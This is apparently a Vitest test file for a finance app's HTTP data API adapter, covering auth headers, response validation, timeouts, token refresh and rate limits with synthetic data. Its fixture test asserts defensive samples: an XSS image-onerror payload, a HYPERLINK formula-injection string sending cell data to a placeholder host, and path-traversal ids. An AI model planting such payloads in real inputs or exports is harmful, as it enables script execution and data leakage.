import { ROUTES } from '@smart-finances/contracts/routes';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Container } from './container';
import { memoryContainer } from './container';
import { DATA_API_TIMEOUT_MS, HttpDataApi, LONG_REQUEST_TIMEOUT_MS, type DataApiFetch } from './data-api';
import { MemoryClock } from './memory/clock';
import { fixtureSeed, MemoryDataApi } from './memory/data-api';
import { MemoryIdentityProvider } from './memory/identity-provider';
import type { MemoryLogger } from './memory/logger';
import { MemorySettings, TEST_SETTINGS } from './memory/settings';
import hostileFixture from '../../fixtures/hostile.json';

const hostileIds = new Set(hostileFixture.transactions.map((t) => t.id));

// T-WSCR-1 (AC-6, AC-15, D-53, D-101, D-133): the data API adapter sends the bearer token, parses replies with the
// contracts, maps statuses and times out at 5 seconds. Synthetic tokens and data only; no network: fetch is a fake.

const SUB = '00000000-0000-4000-9000-00000000a001';
const part = (o: object) => Buffer.from(JSON.stringify(o)).toString('base64url');
const token = (sub: string, n = 0) => `${part({ alg: 'none' })}.${part({ sub, n, token_use: 'access' })}.test`;
const TOKEN = token(SUB);
const API = 'https://api.qa.example.test';

type Call = { url: string; init: Parameters<DataApiFetch>[1] };
type Reply = { status: number; body?: unknown; headers?: Record<string, string> };

function reply({ status, body, headers = {} }: Reply) {
  const text = typeof body === 'string' ? body : body === undefined ? '' : JSON.stringify(body);
  return { status, headers: { get: (n: string) => headers[n.toLowerCase()] ?? null }, text: async () => text };
}

function fakeFetch(answer: (call: Call, i: number) => Reply | Promise<Reply>) {
  const calls: Call[] = [];
  const fetch: DataApiFetch = async (url, init) => {
    const call = { url, init };
    calls.push(call);
    return reply(await answer(call, calls.length - 1));
  };
  return { fetch, calls };
}

function setup(answer: (call: Call, i: number) => Reply | Promise<Reply>, stage: 'test' | 'qa' = 'qa') {
  const clock = new MemoryClock(Date.UTC(2026, 10, 5, 12, 0, 30));
  const c: Container = memoryContainer(new MemorySettings({ ...TEST_SETTINGS, STAGE: stage, API_URL: API }), clock);
  const f = fakeFetch(answer);
  const api = new HttpDataApi({ ...c, fetch: f.fetch });
  return { c, api, calls: f.calls, clock };
}

const tx = (id: string) => ({
  id,
  date: '2026-05-02',
  date_precision: 'day',
  kind: 'expense',
  amount: -12345,
  currency: 'ARS',
  category: 'Groceries',
  merchant: 'Shop',
  recipient_key: '',
  description_raw: 'SHOP',
  source: 'mercadopago',
  source_ref: id,
  country: 'AR',
  flags: [],
  import_batch: 'b1',
  review: { reasons: [], approved: false },
});

afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
});

describe('T-WSCR-1: HttpDataApi requests', () => {
  it('T-WSCR-1: sends the access token as a bearer token, one route per method, never cached or redirected (D-53)', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: { items: [tx('a')], cursor: 'c2' } }));
    const r = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-06', kind: 'expense', q: 'shop & co' });
    expect(r).toEqual({ ok: true, data: { items: [tx('a')], cursor: 'c2' } });
    const [call] = calls;
    expect(calls).toHaveLength(1);
    const url = new URL(call!.url);
    expect(url.origin + url.pathname).toBe(`${API}/transactions`);
    expect(Object.fromEntries(url.searchParams)).toEqual({
      from: '2026-05',
      to: '2026-06',
      kind: 'expense',
      q: 'shop & co',
      sort: 'date',
      order: 'desc',
      limit: '50',
    });
    expect(call!.init.method).toBe('GET');
    expect(call!.init.headers.authorization).toBe(`Bearer ${TOKEN}`);
    expect(call!.init.body).toBeUndefined();
    expect(call!.init.cache).toBe('no-store');
    expect(call!.init.redirect).toBe('error');
    expect(call!.init.signal).toBeInstanceOf(AbortSignal);
  });

  it('T-WSCR-1: path values are encoded and bodies are JSON for each changing route', async () => {
    const replies: Record<string, unknown> = {
      'PUT /rates/2026-05': { month: '2026-05', ars_per_usd: 1321.07 },
      'PUT /transactions/id%2F..%3Fx/review': { review: { reasons: [], approved: true } },
      'GET /imports/imp%201': {
        import_id: 'imp 1',
        source: 'csv',
        file_name: 'a.csv',
        period: '2026-05',
        status: 'done',
        created_at: '2026-05-01T00:00:00Z',
        active: true,
      },
      'POST /imports': { import_id: 'i1', upload: { url: 'https://uploads.qa.example.test/', fields: { key: 'k' } }, expires_at: 'x' },
      'DELETE /data': { deleted: { items: 3, files: 1 } },
    };
    const { api, calls } = setup((call) => {
      const key = `${call.init.method} ${new URL(call.url).pathname}`;
      return { status: key === 'POST /imports' ? 201 : key === 'DELETE /data' ? 202 : 200, body: replies[key] };
    });
    expect((await api.putRate(TOKEN, { month: '2026-05', ars_per_usd: 1321.07 })).ok).toBe(true);
    expect((await api.putReview(TOKEN, { id: 'id/..?x', date: '2026-05-02', approved: true })).ok).toBe(true);
    expect((await api.getImport(TOKEN, { id: 'imp 1' })).ok).toBe(true);
    expect((await api.requestImport(TOKEN, { source: 'csv', file_name: 'a.csv', size: 10 })).ok).toBe(true);
    expect(await api.erase(TOKEN, { confirm: 'DELETE' })).toEqual({ ok: true, data: { deleted: { items: 3, files: 1 } } });
    expect(calls.map((c) => `${c.init.method} ${new URL(c.url).pathname} ${c.init.body ?? ''}`)).toEqual([
      'PUT /rates/2026-05 {"ars_per_usd":1321.07}',
      'PUT /transactions/id%2F..%3Fx/review {"date":"2026-05-02","approved":true}',
      'GET /imports/imp%201 ',
      'POST /imports {"source":"csv","file_name":"a.csv","size":10}',
      'DELETE /data {"confirm":"DELETE"}',
    ]);
    for (const c of calls) expect(c.init.headers.authorization).toBe(`Bearer ${TOKEN}`);
    for (const c of calls.filter((c) => c.init.body)) expect(c.init.headers['content-type']).toBe('application/json');
  });

  it('T-WSCR-1: an input the contracts refuse never reaches the API', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: {} }));
    expect(await api.listTransactions(TOKEN, { from: '2026-07', to: '2026-05' })).toEqual({ ok: false, kind: 'failed', code: 'bad_request' });
    expect(await api.putRate(TOKEN, { month: '2026-13', ars_per_usd: 1 })).toEqual({ ok: false, kind: 'failed', code: 'bad_request' });
    expect(calls).toHaveLength(0);
  });

  it('T-WSCR-1: a token without a person is refused without a request', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: { items: [] } }));
    expect(await api.rates('not-a-jwt', {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(0);
  });
});

describe('T-WSCR-1: HttpDataApi replies are parsed with @smart-finances/contracts (D-133)', () => {
  it('T-WSCR-1: a reply that does not match the contract is a failure, never passed on', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [{ ...tx('a'), amount: 12.5 }] } }));
    expect(await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' })).toEqual({ ok: false, kind: 'failed', code: 'bad_reply' });
  });

  it('T-ENR-1: the API reply carries the recipient key, empty for an old row, in transactions and review', async () => {
    const keyed = { ...tx('b'), recipient_key: 'f'.repeat(32) };
    const { api } = setup((call) =>
      new URL(call.url).pathname === '/review'
        ? { status: 200, body: { items: [{ ...tx('a'), review: undefined, reasons: [] }] } }
        : { status: 200, body: { items: [tx('a'), keyed] } },
    );
    const list = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' });
    if (!list.ok) throw new Error('list failed');
    expect(list.data.items.map((t) => t.recipient_key)).toEqual(['', 'f'.repeat(32)]);
    const review = await api.review(TOKEN, {});
    if (!review.ok) throw new Error('review failed');
    expect(review.data.items[0]!.recipient_key).toBe('');
  });

  it('T-ENR-1: a reply row without recipient_key is refused, since the API always fills it', async () => {
    const old: Record<string, unknown> = { ...tx('a') };
    delete old.recipient_key;
    const { api } = setup(() => ({ status: 200, body: { items: [old] } }));
    expect(await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' })).toEqual({ ok: false, kind: 'failed', code: 'bad_reply' });
  });

  it('T-WSCR-1: a reply that is not JSON is a failure', async () => {
    const { api } = setup(() => ({ status: 200, body: '<html>gateway</html>' }));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'bad_reply' });
  });

  it('T-WSCR-1: unknown fields are dropped by the schema', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [{ month: '2026-05', ars_per_usd: 1300, extra: '<b>x</b>' }] } }));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: true, data: { items: [{ month: '2026-05', ars_per_usd: 1300 }] } });
  });

  it('T-WSCR-1: the export is the CSV text as sent', async () => {
    const csv = `${(ROUTES['GET /export'].columns as readonly string[]).join(',')}\n"a","b"`;
    const { api, calls } = setup(() => ({ status: 200, body: csv, headers: { 'content-type': 'text/csv' } }));
    expect(await api.exportCsv(TOKEN, {})).toEqual({ ok: true, data: csv });
    expect(new URL(calls[0]!.url).pathname).toBe('/export');
  });
});

describe('T-WSCR-1: HttpDataApi maps statuses', () => {
  const error = (code: string) => ({ error: { code, message: 'synthetic' } });
  it.each([
    [403, error('unauthorized'), { ok: false, kind: 'not_found', code: 'unauthorized' }],
    [404, error('not_found'), { ok: false, kind: 'not_found', code: 'not_found' }],
    [409, error('conflict'), { ok: false, kind: 'conflict', code: 'conflict' }],
    [409, error('source_file_only'), { ok: false, kind: 'conflict', code: 'source_file_only' }],
    [400, error('bad_request'), { ok: false, kind: 'failed', code: 'bad_request' }],
    [413, error('too_large'), { ok: false, kind: 'failed', code: 'too_large' }],
    [429, { message: 'Too Many Requests' }, { ok: false, kind: 'failed', code: 'throttled', retryAfter: 7 }],
    [500, { message: 'Internal Server Error' }, { ok: false, kind: 'failed', code: 'server' }],
    [503, 'Service Unavailable', { ok: false, kind: 'failed', code: 'server', retryAfter: 7 }],
  ])('T-WSCR-1: HTTP %i is %j', async (status, body, expected) => {
    const headers = status === 429 || status === 503 ? { 'retry-after': '7' } : undefined;
    const { api } = setup(() => ({ status, body, headers }));
    expect(await api.getImport(TOKEN, { id: 'i1' })).toEqual(expected);
  });

  it('T-WSCR-1: a network failure is a failure with retry', async () => {
    const { api } = setup(() => Promise.reject(new Error('ECONNRESET')));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'network' });
  });

  it('T-WSCR-1: times out at 5 seconds and aborts the request (D-101)', async () => {
    expect(DATA_API_TIMEOUT_MS).toBe(5_000);
    vi.useFakeTimers();
    let signal: AbortSignal | undefined;
    const { api } = setup((call) => {
      signal = call.init.signal;
      return new Promise<Reply>(() => {});
    });
    const pending = api.totals(TOKEN, { from: '2026-05', to: '2026-05' });
    await vi.advanceTimersByTimeAsync(4_999);
    expect(signal?.aborted).toBe(false);
    await vi.advanceTimersByTimeAsync(1);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
    expect(signal?.aborted).toBe(true);
  });

  it('T-WSCR-1: the 5 seconds cover a slow body too', async () => {
    vi.useFakeTimers();
    const slow: DataApiFetch = async () => ({ status: 200, headers: { get: () => null }, text: () => new Promise<string>(() => {}) });
    const c = memoryContainer(new MemorySettings({ ...TEST_SETTINGS, STAGE: 'qa', API_URL: API }));
    const pending = new HttpDataApi({ ...c, fetch: slow }).rates(TOKEN, {});
    await vi.advanceTimersByTimeAsync(5_000);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
  });
});

describe('T-WSCR-1: export and erase have a 25-second budget (owner decisions, PR 4 review: RK-13 and the data spec)', () => {
  afterEach(() => vi.useRealTimers());
  it('T-WSCR-1: export is still waiting after 5 seconds and times out at 25 seconds', async () => {
    expect(LONG_REQUEST_TIMEOUT_MS).toBe(25_000);
    vi.useFakeTimers();
    let signal: AbortSignal | undefined;
    const { api } = setup((call) => {
      signal = call.init.signal;
      return new Promise<Reply>(() => {});
    });
    const pending = api.exportCsv(TOKEN, {});
    await vi.advanceTimersByTimeAsync(24_999);
    expect(signal?.aborted).toBe(false);
    await vi.advanceTimersByTimeAsync(1);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
    expect(signal?.aborted).toBe(true);
  });

  it('T-WSCR-1: erase is still waiting after 5 seconds and times out at 25 seconds (SF-168)', async () => {
    vi.useFakeTimers();
    let signal: AbortSignal | undefined;
    const { api } = setup((call) => {
      signal = call.init.signal;
      return new Promise<Reply>(() => {});
    });
    const pending = api.erase(TOKEN, { confirm: 'DELETE' });
    await vi.advanceTimersByTimeAsync(24_999);
    expect(signal?.aborted).toBe(false);
    await vi.advanceTimersByTimeAsync(1);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
    expect(signal?.aborted).toBe(true);
  });
});

describe('T-WSCR-1: HttpDataApi on 401: one refresh, then signed out', () => {
  /** A memory pool user who finished setup: their refresh token is one the fake will refresh. */
  async function signedIn(c: Container, accessToken: string) {
    const idp = c.identityProvider as MemoryIdentityProvider;
    await idp.signUp('person@example.test', 'a long synthetic password', 'en');
    await idp.confirm('person@example.test', '123456');
    const first = await idp.passwordAuth('person@example.test', 'a long synthetic password');
    if (!first.ok || !('session' in first)) throw new Error('no challenge');
    const assoc = await idp.associate(first.session);
    if (!assoc.ok) throw new Error('no setup');
    const done = await idp.verifySetup('person@example.test', assoc.session, '000000');
    const user = await idp.adminGet('person@example.test');
    if (!done.ok || !user.ok) throw new Error('no tokens');
    return seed(c, user.sub, accessToken, done.tokens.refresh);
  }
  async function seed(c: Container, sub: string, accessToken: string, refreshToken: string) {
    const now = c.clock.now();
    await c.sessionStore.create({
      idHash: 'h1',
      sub,
      accessToken,
      idToken: 'id',
      refreshToken,
      createdAt: now,
      lastSeenAt: now,
      expiresAt: now + 3_600_000,
    });
    return sub;
  }

  it('T-WSCR-1: refreshes once, stores the new tokens and retries with the new access token', async () => {
    const { c, api, calls } = setup((_call, i) =>
      i === 0 ? { status: 401, body: { error: { code: 'unauthorized', message: 'x' } } } : { status: 200, body: { items: [] } },
    );
    const sub = await signedIn(c, 'pending');
    const old = token(sub, 1);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    expect(await api.rates(old, {})).toEqual({ ok: true, data: { items: [] } });
    expect(calls).toHaveLength(2);
    const fresh = (await c.sessionStore.get('h1'))!.accessToken;
    expect(fresh).not.toBe(old);
    expect(calls[1]!.init.headers.authorization).toBe(`Bearer ${fresh}`);
  });

  it('T-WSCR-1: a second 401 signs the person out: the session row goes and the answer is unauthorized', async () => {
    const { c, api, calls } = setup(() => ({ status: 401, body: { error: { code: 'unauthorized', message: 'x' } } }));
    const sub = await signedIn(c, 'pending');
    const old = token(sub, 2);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    expect(await api.rates(old, {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(2);
    expect(await c.sessionStore.get('h1')).toBeUndefined();
    const events = (c.logger as MemoryLogger).events.filter((e) => e.name === 'signout');
    expect(events).toEqual([{ name: 'signout', outcome: 'data_api_unauthorized', sub, requestId: expect.any(String) }]);
  });

  it('T-WSCR-1: a refused refresh signs out without a second request', async () => {
    const { c, api, calls } = setup(() => ({ status: 401, body: { error: { code: 'unauthorized', message: 'x' } } }));
    const sub = SUB;
    await seed(c, sub, TOKEN, 'unknown-refresh-token');
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(1);
    expect(await c.sessionStore.get('h1')).toBeUndefined();
  });

  it('T-WSCR-1: calls made together refresh only once', async () => {
    let old = '';
    const unauthorized = { status: 401, body: { error: { code: 'unauthorized', message: 'x' } } };
    const { c, api, calls } = setup((call) =>
      call.init.headers.authorization === `Bearer ${old}` ? unauthorized : { status: 200, body: { items: [] } },
    );
    const sub = await signedIn(c, 'pending');
    old = token(sub, 3);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    const refresh = vi.spyOn(c.identityProvider, 'refresh');
    const [a, b] = await Promise.all([api.rates(old, {}), api.review(old, {})]);
    expect(a.ok && b.ok).toBe(true);
    expect(refresh).toHaveBeenCalledTimes(1);
    expect(calls).toHaveLength(4);
    // A later call in the same request, still holding the old token, uses the renewed one without a new refresh.
    expect((await api.rates(old, {})).ok).toBe(true);
    expect(refresh).toHaveBeenCalledTimes(1);
  });
});

describe("T-WSCR-1: HttpDataApi counts the person's requests (AC-17, D-120)", () => {
  it('T-WSCR-1: past the person limit the answer is limited with the wait, and nothing is sent', async () => {
    const { c, api, calls } = setup(() => ({ status: 200, body: { items: [] } }), 'test');
    for (let i = 0; i < 5; i++) expect((await api.rates(TOKEN, {})).ok).toBe(true);
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'limited', retryAfter: 30 });
    expect(calls).toHaveLength(5);
    const limited = (c.logger as MemoryLogger).events.filter((e) => e.name === 'rate_limited');
    expect(limited).toEqual([{ name: 'rate_limited', outcome: 'person', sub: SUB, requestId: expect.any(String) }]);
    // Another person is still served (AC-17).
    expect((await api.rates(token('00000000-0000-4000-9000-00000000b002'), {})).ok).toBe(true);
  });

  it('T-WSCR-1: the qa limit is 120 a minute', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [] } }));
    for (let i = 0; i < 120; i++) expect((await api.rates(TOKEN, {})).ok).toBe(true);
    expect(await api.rates(TOKEN, {})).toMatchObject({ ok: false, kind: 'limited' });
  });

  it('T-WSCR-1: a counter failure fails closed', async () => {
    const { c, api, calls } = setup(() => ({ status: 200, body: { items: [] } }));
    vi.spyOn(c.counter, 'incr').mockRejectedValue(new Error('down'));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'unavailable' });
    expect(calls).toHaveLength(0);
  });
});

describe('T-WSCR-1: the memory adapter on the fixtures', () => {
  it('T-WSCR-1: the fixtures parse with the contracts, payments-report rows are source mercadopago, hostile rows included', () => {
    const seed = fixtureSeed();
    const rows = ROUTES['GET /transactions'].reply.parse({ items: seed.transactions });
    expect(rows.items.length).toBeGreaterThan(500);
    // The 8 adversarial rows of data/synthetic/transactions.csv, as payments-report rows to review.
    const hostile = rows.items.filter((t) => hostileIds.has(t.id));
    expect(hostile).toHaveLength(8);
    for (const t of hostile) expect([t.source, t.review.reasons]).toEqual(['mercadopago', ['needs_review']]);
    const texts = hostile.map((t) => t.description_raw);
    expect(texts).toContain('<img src=x onerror=alert(1)>');
    expect(texts).toContain('=HYPERLINK("http://example.invalid/?x="&A1,"click")');
    expect(texts.some((t) => t.length >= 2000)).toBe(true);
    expect(rows.items.filter((t) => t.review.reasons.length > 0)).toHaveLength(64 + 8);
    for (const i of seed.imports) expect(ROUTES['GET /imports/{id}'].reply.safeParse(i).success, i.import_id).toBe(true);
    expect(seed.imports.some((i) => i.skipped?.some((s) => s.reason === '<img src=x onerror=alert(1)>'))).toBe(true);
    expect(Object.keys(seed.rates)).toContain('2026-09');
    expect(seed.rates['2026-05']).toBe(1321.07);
  });

  it('T-WSCR-1: a memory data API with limits answers limited past the person limit', async () => {
    const c = memoryContainer();
    const api = new MemoryDataApi(c.clock, { limits: c, logger: c.logger });
    api.allowToken(TOKEN);
    api.seed(fixtureSeed());
    for (let i = 0; i < 5; i++) expect((await api.rates(TOKEN)).ok).toBe(true);
    expect(await api.rates(TOKEN)).toMatchObject({ ok: false, kind: 'limited' });
    expect(await api.rates('unknown')).toEqual({ ok: false, kind: 'unauthorized' });
  });
});

describe('T-WSCR-1: the container wires the real adapter (D-167)', () => {
  it('T-WSCR-1: STAGE=test seeds the test person with the fixtures behind the person limit', async () => {
    vi.stubEnv('STAGE', 'test');
    const SHARED = Symbol.for('smart-finances.container');
    delete (globalThis as { [SHARED]?: unknown })[SHARED];
    const { getContainer, TEST_PERSON } = await import('./container');
    const c = getContainer();
    const { createHash } = await import('node:crypto');
    const row = await c.sessionStore.get(createHash('sha256').update(TEST_PERSON.sessionId).digest('hex'));
    const r = await c.dataApi.listTransactions(row!.accessToken, { from: '2026-03', to: '2026-03' });
    expect(r.ok && r.data.items.length).toBe(50);
    delete (globalThis as { [SHARED]?: unknown })[SHARED];
    vi.unstubAllEnvs();
  });
});

// T-ENR-20 (AC-6, D-13, D-18): putLabel over HTTP, and the memory adapter applying labels the way the API does.
// Synthetic keys and names only.
const KEY = 'a'.repeat(32);
const LABEL_REPLY = {
  label: { recipient_key: KEY, name: 'Made-up Landlord', category: 'Housing & utilities', updated_at: '2026-11-05T12:00:00.000Z' },
};

describe('T-ENR-20: putLabel on the data API', () => {
  it('T-ENR-20: PUT /recipients/{key}/label sends the name and category and parses the reply with the contract', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: LABEL_REPLY }));
    expect(await api.putLabel(TOKEN, { key: KEY, name: '  Made-up Landlord ', category: 'Housing & utilities' })).toEqual({
      ok: true,
      data: LABEL_REPLY,
    });
    expect(calls.map((c) => `${c.init.method} ${new URL(c.url).pathname} ${c.init.body}`)).toEqual([
      `PUT /recipients/${KEY}/label {"name":"Made-up Landlord","category":"Housing & utilities"}`,
    ]);
    expect(calls[0]!.init.headers.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it('T-ENR-20: a bad key, an empty or long name and Uncategorized never reach the API; a reply off the contract is refused', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: { label: { ...LABEL_REPLY.label, category: 'Uncategorized' } } }));
    const refused = { ok: false, kind: 'failed', code: 'bad_request' };
    expect(await api.putLabel(TOKEN, { key: 'A'.repeat(32), name: 'x', category: 'Housing & utilities' })).toEqual(refused);
    expect(await api.putLabel(TOKEN, { key: '../x', name: 'x', category: 'Housing & utilities' })).toEqual(refused);
    expect(await api.putLabel(TOKEN, { key: KEY, name: '   ', category: 'Housing & utilities' })).toEqual(refused);
    expect(await api.putLabel(TOKEN, { key: KEY, name: 'x'.repeat(81), category: 'Housing & utilities' })).toEqual(refused);
    expect(await api.putLabel(TOKEN, { key: KEY, name: 'x', category: 'Uncategorized' })).toEqual(refused);
    expect(calls).toHaveLength(0);
    expect(await api.putLabel(TOKEN, { key: KEY, name: 'x', category: 'Housing & utilities' })).toEqual({
      ok: false,
      kind: 'failed',
      code: 'bad_reply',
    });
  });

  it('T-ENR-20: the erase window answers conflict', async () => {
    const { api } = setup(() => ({ status: 409, body: { error: { code: 'conflict', message: 'erasing' } } }));
    expect(await api.putLabel(TOKEN, { key: KEY, name: 'x', category: 'Housing & utilities' })).toEqual({
      ok: false,
      kind: 'conflict',
      code: 'conflict',
    });
  });
});

describe('T-ENR-20: the memory adapter applies labels like the API', () => {
  const keyed = (id: string, over: object = {}) => ({
    ...tx(id),
    date_precision: 'day' as const,
    recipient_key: KEY,
    merchant: '',
    category: 'Uncategorized',
    ...over,
  });
  const make = () => {
    const clock = new MemoryClock(Date.UTC(2026, 10, 5, 12, 0, 0));
    const api = new MemoryDataApi(clock);
    api.allowToken(TOKEN);
    api.seed({
      transactions: [
        keyed('k1', { flags: ['needs_review'], review: { reasons: ['needs_review'], approved: false } }),
        keyed('k2', {
          amount: -500,
          review: { reasons: [], category_override: 'Dining out', approved: false, updated_at: '2026-11-01T00:00:00.000Z' },
        }),
        {
          ...tx('other'),
          date_precision: 'day' as const,
          merchant: 'Made-up Shop',
          flags: ['needs_review'],
          review: { reasons: ['needs_review'], approved: false },
        },
      ],
    });
    return { api, clock };
  };

  it('T-ENR-20: a label names, categorizes and approves every row with its key, over a review choice; other rows stay', async () => {
    const { api } = make();
    const saved = await api.putLabel(TOKEN, { key: KEY, name: ' Made-up Landlord ', category: 'Housing & utilities' });
    expect(saved).toEqual({
      ok: true,
      data: { label: { recipient_key: KEY, name: 'Made-up Landlord', category: 'Housing & utilities', updated_at: '2026-11-05T12:00:00.000Z' } },
    });

    const list = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' });
    if (!list.ok) throw new Error('list failed');
    const byId = new Map(list.data.items.map((t) => [t.id, t]));
    expect(byId.get('k1')).toMatchObject({
      merchant: 'Made-up Landlord',
      category: 'Housing & utilities',
      review: { reasons: [], category_override: 'Housing & utilities', approved: true },
    });
    expect(byId.get('k2')).toMatchObject({
      merchant: 'Made-up Landlord',
      category: 'Housing & utilities',
      review: { category_override: 'Housing & utilities', approved: true, updated_at: '2026-11-01T00:00:00.000Z' },
    });
    expect(byId.get('other')).toMatchObject({ merchant: 'Made-up Shop', category: 'Groceries', review: { approved: false } });
    // The replies still parse with the contracts.
    expect(ROUTES['GET /transactions'].reply.safeParse(list.data).success).toBe(true);

    const review = await api.review(TOKEN);
    if (!review.ok) throw new Error('review failed');
    expect(review.data.items.map((t) => t.id)).toEqual(['other']);

    const totals = await api.totals(TOKEN, { from: '2026-05', to: '2026-05' });
    if (!totals.ok) throw new Error('totals failed');
    expect(totals.data.months[0]!.totals.expense).toEqual({ 'Housing & utilities': { ARS: -12845 }, Groceries: { ARS: -12345 } });

    const csv = await api.exportCsv(TOKEN);
    if (!csv.ok) throw new Error('export failed');
    expect(csv.data.split('\n').filter((l) => l.includes('"Made-up Landlord"') && l.includes('"Housing & utilities"'))).toHaveLength(2);
  });

  it('T-ENR-20: the filters see the label: category and search match the label, not the stored row', async () => {
    const { api } = make();
    await api.putLabel(TOKEN, { key: KEY, name: 'Made-up Landlord', category: 'Housing & utilities' });
    const housing = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05', category: 'Housing & utilities' });
    const named = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05', q: 'landlord' });
    expect(housing.ok && housing.data.items.map((t) => t.id).sort()).toEqual(['k1', 'k2']);
    expect(named.ok && named.data.items.map((t) => t.id).sort()).toEqual(['k1', 'k2']);
  });

  it('T-ENR-20: a row seeded after the label shows it; labeling again replaces it; erase removes labels', async () => {
    const { api } = make();
    await api.putLabel(TOKEN, { key: KEY, name: 'Made-up Landlord', category: 'Housing & utilities' });
    api.seed({ transactions: [keyed('later', { date: '2026-05-20' })] });
    await api.putLabel(TOKEN, { key: KEY, name: 'Made-up Owner', category: 'Home' });
    const list = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' });
    if (!list.ok) throw new Error('list failed');
    expect(
      list.data.items
        .filter((t) => t.recipient_key === KEY)
        .map((t) => [t.id, t.merchant, t.category])
        .sort(),
    ).toEqual([
      ['k1', 'Made-up Owner', 'Home'],
      ['k2', 'Made-up Owner', 'Home'],
      ['later', 'Made-up Owner', 'Home'],
    ]);
    expect((await api.erase(TOKEN, { confirm: 'DELETE' })).ok).toBe(true);
    api.seed({ transactions: [keyed('after')] });
    const after = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' });
    expect(after.ok && after.data.items.map((t) => [t.merchant, t.category])).toEqual([['', 'Uncategorized']]);
  });

  it('T-ENR-20: a bad key is not_found and a bad body is bad_request, as the API answers', async () => {
    const { api } = make();
    expect(await api.putLabel(TOKEN, { key: 'nope', name: 'x', category: 'Housing & utilities' })).toEqual({
      ok: false,
      kind: 'not_found',
      code: 'not_found',
    });
    expect(await api.putLabel(TOKEN, { key: KEY, name: 'x', category: 'Uncategorized' })).toEqual({ ok: false, kind: 'failed', code: 'bad_request' });
    expect(await api.putLabel('unknown', { key: KEY, name: 'x', category: 'Housing & utilities' })).toEqual({ ok: false, kind: 'unauthorized' });
  });
});
